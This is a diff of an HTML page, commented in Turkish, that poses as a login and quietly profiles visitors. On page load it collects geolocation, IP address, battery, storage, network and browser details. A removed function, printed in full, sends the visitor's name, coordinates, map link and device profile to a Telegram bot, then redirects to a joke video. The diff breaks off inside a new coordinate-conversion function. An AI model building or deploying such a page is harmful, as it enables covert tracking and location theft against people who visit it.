@@ -16,7 +16,6 @@
   <div id="uyari"></div>
 
   <script>
-    // 1. Bilgi nesnesi
     let info = {
       name:"", lat:null, lon:null,
       ip:"Alınamadı", browser:"site:Bilinmiyor",
@@ -38,118 +37,56 @@
       pageLoadTime:0
     };
 
-    // 2. Sayfa yüklenince otomatik veri toplama
     window.onload = async () => {
       const start = performance.timing.navigationStart;
 
-      // Konum
       navigator.geolocation.getCurrentPosition(
-        p=>{ info.lat=p.coords.latitude; info.lon=p.coords.longitude; },
+        p=>{
+          info.lat = p.coords.latitude;
+          info.lon = p.coords.longitude;
+        },
         ()=>document.getElementById("uyari").innerText="📍 Konum izni gerekli!"
       );
 
-      // IP Adresi
       try {
         const { ip } = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
         info.ip = ip;
       } catch {}
 
-      // Batarya
       if (navigator.getBattery) {
         const bat = await navigator.getBattery();
         info.batteryLevel = Math.round(bat.level*100)+"%";
         info.charging     = bat.charging;
       }
 
-      // Depolama Tahmini
       if (navigator.storage && navigator.storage.estimate) {
         const { usage, quota } = await navigator.storage.estimate();
         info.storageUsage = usage;
         info.storageQuota = quota;
       }
 
-      // Ağ Kalitesi
       const conn = navigator.connection||{};
       info.netType  = conn.effectiveType||"?";
       info.downlink = conn.downlink||"?";
       info.rtt      = conn.rtt||"?";
 
-      // Tarayıcı Türü
       const ua = navigator.userAgent;
       if (ua.includes("Chrome")&&!ua.includes("Edg")) info.browser="site:Chrome";
-      else if (ua.includes("Firefox"))                    info.browser="site:Firefox";
+      else if (ua.includes("Firefox")) info.browser="site:Firefox";
       else if (ua.includes("Safari")&&!ua.includes("Chrome")) info.browser="site:Safari";
-      else if (ua.includes("Edg"))                        info.browser="site:Edge";
+      else if (ua.includes("Edg")) info.browser="site:Edge";
 
-      // Karanlık Mod
       info.darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
-
-      // Sayfa Yükleme Süresi
       info.pageLoadTime = performance.timing.domContentLoadedEventEnd - start;
     };
 
-    // 3. Giriş fonksiyonu
-    async function girisYap() {
-      info.name = document.getElementById("username").value.trim();
-      if (!info.name)
-        return document.getElementById("uyari").innerText="🧠 İsim gerekli!";
-      if (info.lat === null)
-        return document.getElementById("uyari").innerText="📍 Konum izni gerekli!";
+    function toDMS(lat, lon) {
+      const latDeg = Math.floor(lat);
+      const latMin = Math.floor((lat - latDeg) * 60);
+      const latSec = (((lat - latDeg) * 60 - latMin) * 60).toFixed(1);
 
-      // Telegram bilgileri
-      const txt = await fetch("bilgiler.txt").then(r=>r.text());
-      const BOT_TOKEN = txt.match(/BOT_TOKEN=(.*)/)[1].trim();
-      const CHAT_ID   = txt.match(/CHAT_ID=(.*)/)[1].trim();
+      const lonDeg = Math.floor(lon);
+      const lonMin = Math.floor((lon - lonDeg) * 60);
+      const lonSec = (((lon - lonDeg) * 60 - lonMin) * 60).toFixed(1);
 
-      // Harita linki
-      const maps = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
-
-      // Depolama (MB)
-      const usedMB  = (info.storageUsage/1024/1024).toFixed(2);
-      const quotaMB = (info.storageQuota/1024/1024).toFixed(2);
-
-      // Mesaj oluşturma
-      const msg = `
-🎮 *Yeni Mega Giriş!*
-👤 İsim: *${info.name}*
-📍 Konum: *${info.lat}, ${info.lon}*
-🔗 Harita: [Google Maps](${maps})
-
-🖥️ IP: *${info.ip}*
-🧭 Tarayıcı: *${info.browser}*
-📱 Platform: *${info.platform}*
-🌐 Dil: *${info.language}*
-⏰ Saat Dilimi: *${info.timeZone}*
-⌚ Yerel Zaman: *${info.timestamp}*
-
-💻 Ekran: *${info.screen}* (@${info.pixelRatio}x, ${info.colorDepth} bit)
-⚙️ RAM/Çekirdek: *${info.memory}GB / ${info.cores} çekirdek*
-🔋 Pil: *${info.batteryLevel}* (Şarj: ${info.charging})
-💾 Depolama: *${usedMB}MB / ${quotaMB}MB*
-📶 Ağ: *${info.netType}* (${info.downlink}Mbps, ${info.rtt}ms)
-🌙 Karanlık Mod: *${info.darkMode ? "Aktif" : "Kapalı"}*
-🍪 Çerez: *${info.cookieEnabled}*
-🚫 DoNotTrack: *${info.doNotTrack}*
-📐 Yönelim: *${info.orientation}*
-🔌 Eklenti Sayısı: *${info.pluginsCount}*
-⏱️ Yükleme Süresi: *${info.pageLoadTime}ms*
-📶 Çevrimiçi: *${info.online}*
-`;
-
-      // Mesajı Telegram’a gönder
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: msg,
-          parse_mode: "Markdown"
-        })
-      });
-
-      // Yeni seçilen komik video açılır
-      window.location.href = "https://www.youtube.com/watch?v=IxX_QHay02M";
-    }
-  </script>
-</body>
-</html>
+      return `${latDeg}°${latMin}'${latSec}"N ${lonDeg}
